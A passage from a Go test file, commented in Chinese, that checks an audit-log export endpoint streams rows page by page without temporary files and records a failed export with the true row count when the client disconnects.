		t.Errorf("reason = %q", r.reason())
	}
	if a := o.auditRows(`action = 'ops.audit.export' AND phase = 'result' AND result = 'failure' AND code = 4131`); len(a) != 1 {
		t.Errorf("audit = %v", a)
	}
}

// flushWriter 记下每次 Flush 时已经写了多少，可以在写到一定量之后失败（客户端断开）。
type flushWriter struct {
	header    http.Header
	status    int
	buf       bytes.Buffer
	flushes   []int
	failAfter int
}

func (f *flushWriter) Header() http.Header { return f.header }
func (f *flushWriter) WriteHeader(s int)   { f.status = s }
func (f *flushWriter) Write(p []byte) (int, error) {
	if f.failAfter > 0 && f.buf.Len() > f.failAfter {
		return 0, errors.New("client went away")
	}
	return f.buf.Write(p)
}
func (f *flushWriter) Flush() { f.flushes = append(f.flushes, f.buf.Len()) }

// CS-061：流式，不落盘。每页写完就推给客户端；过程中不产生临时文件；客户端断开时停止，审计记下实际条数。
func TestAuditExport_Streaming(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("TMPDIR", tmp)
	o := newOpsWorld(t)
	bulkAudit(t, o.world, 1200, "bulk.test")
	o.auditor.stepUp()
	raw, _ := json.Marshal(exportRange(o.world, map[string]any{"action": "bulk.test"}))
	opsSpace, _ := o.a.Cfg.Space("ops")
	serve := func(w *flushWriter) {
		req := httptest.NewRequest("POST", exportPath, bytes.NewReader(raw))
		req.RemoteAddr = "127.0.0.1:1"
		req.Header.Set("X-Forwarded-For", o.auditor.ip)
		req.Header.Set("Origin", o.auditor.origin)
		req.Header.Set("X-CSRF-Token", o.auditor.csrf)
		req.Header.Set("Cookie", o.auditor.cookieN+"="+o.auditor.cookie)
		o.a.Handler(opsSpace).ServeHTTP(w, req)
	}

	w := &flushWriter{header: http.Header{}}
	serve(w)
	if w.status != 200 {
		t.Fatalf("status %d: %s", w.status, w.buf.String())
	}
	_, rows := parseExport(t, reply{status: 200, raw: w.buf.String()})
	if len(rows) != 1200 {
		t.Fatalf("rows = %d", len(rows))
	}
	// 1200 条按每页 500 条：至少 3 次 Flush，而且第一次时还远没写完。
	if len(w.flushes) < 3 || w.flushes[0] >= w.buf.Len()/2 {
		t.Errorf("flushes = %v of %d bytes: not streamed", w.flushes, w.buf.Len())
	}
	if left, err := os.ReadDir(tmp); err != nil || len(left) != 0 {
		t.Errorf("temp files: %v %v", left, err)
	}

	// 客户端中途断开：连接直接断开，审计记 failure 和实际条数，不说成功。
	w = &flushWriter{header: http.Header{}, failAfter: 1000}
	func() {
		defer func() {
			if r := recover(); r != http.ErrAbortHandler {
				t.Errorf("recover = %v", r)
			}
		}()
		serve(w)
	}()
	a := o.auditRows(`action = 'ops.audit.export' AND phase = 'result' AND result = 'failure'`)
	if len(a) != 1 || !strings.Contains(a[0]["params"].(string), `"complete":false`) || strings.Contains(a[0]["params"].(string), `"count":1200`) {
		t.Errorf("audit = %v", a)
	}
}
